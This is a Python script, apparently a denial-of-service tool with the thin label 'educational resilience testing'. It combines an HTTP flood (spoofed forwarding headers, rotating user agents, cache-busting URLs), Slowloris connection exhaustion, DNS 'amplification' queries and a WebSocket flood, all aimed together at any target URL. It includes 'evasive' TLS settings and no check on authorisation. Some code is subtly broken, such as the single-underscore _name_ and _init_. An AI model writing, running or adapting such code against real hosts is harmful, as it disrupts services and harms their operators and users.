#!/usr/bin/env python3
import argparse
import asyncio
import random
import socket
import ssl
import time
import logging
import uvloop
import aiohttp
import dns.resolver
from urllib.parse import urlparse, quote_plus
from fake_useragent import UserAgent

# Install uvloop for better performance
uvloop.install()

# Configure logging (set to DEBUG for detailed logs during testing)
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(levelname)s: %(message)s')
logger = logging.getLogger(_name_)

class AdvancedStressTester:
    def _init_(self, target, duration, intensity):
        self.target = self.normalize_url(target)
        self.duration = duration
        self.intensity = intensity
        self.ssl_ctx = self.create_evasive_ssl()
        self.user_agents = UserAgent()
        self.dns_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
        self.start_time = time.monotonic()
        self.counter = 0
        self.active = True

        # Define attack vectors to use
        self.attack_patterns = [
            self.http_flood,
            self.slowloris,
            self.dns_amplification,
            self.websocket_flood
        ]

    def normalize_url(self, url):
        parsed = urlparse(url)
        if not parsed.scheme:
            # Randomly choose between http and https
            parsed = parsed._replace(scheme='https' if random.random() > 0.5 else 'http')
        return parsed.geturl()

    def create_evasive_ssl(self):
        ctx = ssl.create_default_context()
        # The following options are deprecated in recent versions of Python.
        # You can remove or modify them if needed.
        try:
            ctx.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
        except Exception as e:
            logger.debug(f"SSL option deprecation handling: {e}")
        ctx.set_ciphers('ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256')
        ctx.set_alpn_protocols(['h2', 'http/1.1'])
        return ctx

    async def http_flood(self, session):
        """HTTP flood attack: Send many GET requests with randomized URL paths."""
        # Build a list of randomized URL paths
        paths = ['/' + '/'.join([quote_plus(''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6)))
                                  for _ in range(3)]) for _ in range(100)]
        
        async def single_request_loop():
            while self.active:
                try:
                    target_url = f"{self.target}{random.choice(paths)}?cache_bust={time.time_ns()}"
                    headers = {
                        'User-Agent': self.user_agents.random,
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Referer': random.choice(['https://google.com', 'https://facebook.com'])
                    }
                    async with session.get(target_url, headers=headers, ssl=self.ssl_ctx, timeout=5) as resp:
                        await resp.read()
                        self.counter += 1
                        logger.debug(f"HTTP Flood: Received {resp.status} from {target_url}")
                except Exception as e:
                    logger.debug(f"HTTP Flood request failed: {e}")
                await asyncio.sleep(random.uniform(0.001, 0.1))

        # Launch tasks based on the intensity parameter
        tasks = [asyncio.create_task(single_request_loop()) for _ in range(self.intensity)]
        await asyncio.gather(*tasks)

    async def slowloris(self):
        """Slowloris attack: Open many partial connections to keep the target’s resources busy."""
        hostname = urlparse(self.target).hostname
        port = 80  # Adjust if needed (or use 443 for HTTPS with appropriate SSL wrapping)

        while self.active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((hostname, port))
                initial_headers = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {hostname}\r\n"
                    f"User-Agent: {self.user_agents.random}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    "Connection: keep-alive\r\n"
                    "Content-Length: 42\r\n\r\n"
                )
                s.send(initial_headers.encode())
                while self.active:
                    s.send("X-a: b\r\n".encode())
                    await asyncio.sleep(random.uniform(10, 30))
            except Exception as e:
                logger.debug(f"Slowloris connection failed: {e}")
                try:
                    s.close()
                except Exception:
                    pass
                await asyncio.sleep(1)

    async def dns_amplification(self):
        """DNS amplification attack: Flood using DNS queries to open resolvers."""
        target_domain = urlparse(self.target).hostname
        resolver = dns.resolver.Resolver()
        resolver.nameservers = self.dns_servers

        while self.active:
            try:
                resolver.resolve(target_domain, 'ANY', lifetime=1)
                self.counter += 1
            except Exception as e:
                logger.debug(f"DNS amplification query failed: {e}")
            await asyncio.sleep(0.01)

    async def websocket_flood(self):
        """WebSocket flood: Open WebSocket connections and send large messages repeatedly."""
        parsed = urlparse(self.target)
        ws_scheme = 'wss' if parsed.scheme == 'https' else 'ws'
        ws_url = f"{ws_scheme}://{parsed.netloc}/chat"
        
        while self.active:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.ws_connect(ws_url, ssl=self.ssl_ctx, timeout=10) as ws:
                        while self.active:
                            message = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=512))
                            await ws.send_str(message)
                            await asyncio.sleep(0.01)
            except Exception as e:
                logger.debug(f"WebSocket flood error: {e}")
                await asyncio.sleep(1)

    async def monitor(self):
        """Monitor progress and stop when duration expires."""
        while self.active:
            elapsed = time.monotonic() - self.start_time
            if elapsed > self.duration:
                self.active = False
                break
            logger.error(f"Attack Progress: {self.counter} requests | {elapsed:.1f}s elapsed")
            await asyncio.sleep(5)

    async def reachability_test(self):
        """Perform a simple reachability test to see if the target responds."""
        try:
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=self.ssl_ctx)) as session:
                async with session.get(self.target, timeout=10) as resp:
                    logger.info(f"Reachability test: {self.target} responded with status {resp.status}")
        except Exception as e:
            logger.error(f"Reachability test failed: {e}")

    async def run(self):
        """Run all attack vectors concurrently along with progress monitoring."""
        # Run reachability test first
        await self.reachability_test()

        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=0, ssl=self.ssl_ctx),
            headers={'Connection': 'keep-alive'}
        ) as session:
            tasks = [
                asyncio.create_task(self.monitor()),
                asyncio.create_task(self.http_flood(session)),
                asyncio.create_task(self.slowloris()),
                asyncio.create_task(self.dns_amplification()),
                asyncio.create_task(self.websocket_flood())
            ]
            await asyncio.gather(*tasks, return_exceptions=True)

def main():
    parser = argparse.ArgumentParser(description="Advanced Resilience Testing Suite (Educational Only)")
    parser.add_argument("target", help="Target URL for stress testing")
    parser.add_argument("-d", "--duration", type=int, default=300, help="Test duration in seconds (default: 300)")
    parser.add_argument("-i", "--intensity", type=int, default=100, help="Attack intensity for HTTP flood (default: 100)")
    
    args = parser.parse_args()
    
    tester = AdvancedStressTester(args.target, args.duration, args.intensity)
    
    try:
        asyncio.run(tester.run())
    except KeyboardInterrupt:
        print("\nTest terminated by user.")
    finally:
        print(f"Total attack vectors delivered: {tester.counter}")

if _name_ == "_main_":
    main()